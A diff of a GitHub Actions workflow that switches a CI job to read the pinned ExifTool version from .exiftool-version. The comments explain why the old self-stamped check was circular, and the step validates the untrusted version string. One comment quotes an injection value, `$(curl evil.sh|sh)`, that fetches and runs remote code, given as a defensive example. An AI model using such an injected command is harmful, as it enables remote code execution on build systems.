@@ -400,27 +400,31 @@ jobs:
     timeout-minutes: 10
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
-      # The release is read from the artifact's own stamp rather than pinned
-      # here. A pin in this file would be a second source of truth, and when
-      # the two drifted the job would report hundreds of spurious differences
-      # that look like transcription errors instead of "wrong ExifTool".
-      # The stamp is read out of a file the pull request controls, so it is
+      # The release comes from .exiftool-version, the repo-wide pin. This job
+      # used to read it from the artifact's own EXIFTOOL_VERSION stamp, on the
+      # reasoning that a version here would be a second source of truth -- but
+      # that made the check circular: a stale table set named the release it
+      # would be graded against, so it chose its own oracle and passed forever.
+      # The tables sat at 13.30 for 29 releases while every coverage number in
+      # the repo was measured against the pinned 13.59, and this job stayed
+      # green throughout. verify.py now also refuses a stamp that isn't the pin,
+      # so the two files must agree for this job to pass at all.
+      # The pin is read out of a file the pull request controls, so it is
       # untrusted input. It is validated against a strict numeric pattern here
       # and passed onward through env rather than `${{ }}` interpolation: a
       # value like `$(curl evil.sh|sh)` expanded inside a run: block would be
       # remote code execution on a fork PR.
-      - name: Resolve stamped ExifTool release
+      - name: Resolve pinned ExifTool release
         id: stamp
         run: |
           set -euo pipefail
-          V=$(sed -n 's/^pub const EXIFTOOL_VERSION: &str = "\(.*\)";$/\1/p' \
-                src/exiftool_tables/binary_tables.rs)
-          [ -n "$V" ] || { echo "::error::binary_tables.rs has no EXIFTOOL_VERSION stamp"; exit 1; }
+          V=$(tr -d '[:space:]' < .exiftool-version)
+          [ -n "$V" ] || { echo "::error::.exiftool-version is empty"; exit 1; }
           case "$V" in
             *[!0-9.]* | "" | .* | *.) echo "::error::refusing non-numeric ExifTool version '$V'"; exit 1 ;;
           esac
           echo "version=$V" >> "$GITHUB_OUTPUT"
-          echo "Tables declare ExifTool $V"
+          echo "Repo pins ExifTool $V"
       - name: Fetch that ExifTool source
         env:
           ET_VERSION: ${{ steps.stamp.outputs.version }}
